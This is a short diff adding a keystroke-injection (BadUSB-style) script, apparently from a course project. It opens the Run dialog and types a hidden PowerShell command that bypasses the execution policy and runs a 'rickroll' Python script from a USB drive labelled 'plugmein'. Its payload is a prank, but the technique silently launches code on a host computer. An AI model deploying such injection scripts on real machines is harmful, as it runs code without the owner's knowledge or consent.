@@ -1,0 +1,4 @@
+REM Phase 2
+GUI R
+WAIT 300
+STRING powershell.exe -Exec bypass -w hidden "$DRIVE_LABEL = 'plugmein'; $DRIVE = (Get-Volume -FileSystemLabel $DRIVE_LABEL).DriveLetter; $DIR = ${DRIVE}/CS362/delivery/; cd ${DIR}/python; python run_rickroll.py; exit()"
